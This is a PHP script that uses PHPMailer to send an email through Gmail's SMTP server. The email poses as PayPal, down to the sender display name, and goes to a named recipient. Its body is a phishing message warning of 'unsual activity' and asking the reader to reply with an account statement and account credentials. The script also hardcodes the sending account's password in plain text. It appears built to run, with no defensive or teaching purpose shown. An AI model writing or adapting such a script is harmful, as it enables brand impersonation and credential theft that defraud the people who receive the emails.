<?php
require 'vendor/autoload.php'; 

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    try {
        $mail = new PHPMailer(true);
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com'; 
        $mail->SMTPAuth = true;
        $mail->Username = 'payp42555@gmail.com'; 
        $mail->Password = 'orsaeavtrhzecldm'; 
        $mail->SMTPSecure = 'tls';
        $mail->Port = 587;

        $mail->setFrom('payp42555@gmail.com', 'Paypal');
        $mail->addAddress('queende7728@gmail.com', 'Victoria');
        $mail->Subject = 'Protect your Information';
        $mail->Body = 'You will loose your account if you don/t follow protocols We suspected an unsual activity in your account to prevent your account from being blocked reply back with your Account statement and account credentials Your account is secured with us! ';

        $mail->send();

        echo "Email sent successfully.";
    } catch (Exception $e) {
        echo "Email could not be sent. Error: {$mail->ErrorInfo}";
    }
} else {
    // Handle other HTTP request methods or direct access to the script
    echo "Invalid request.";
}

?>